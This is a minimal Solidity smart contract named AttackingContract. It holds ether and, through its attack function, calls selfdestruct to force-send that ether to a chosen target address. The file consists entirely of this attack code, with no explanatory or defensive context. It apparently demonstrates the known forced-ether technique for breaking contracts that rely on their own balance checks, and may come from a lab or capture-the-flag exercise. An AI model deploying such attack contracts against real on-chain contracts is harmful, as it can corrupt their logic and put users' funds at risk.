// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackingContract {
    constructor() payable {}

    function attack(address payable target) public {
        selfdestruct(target);
    }
}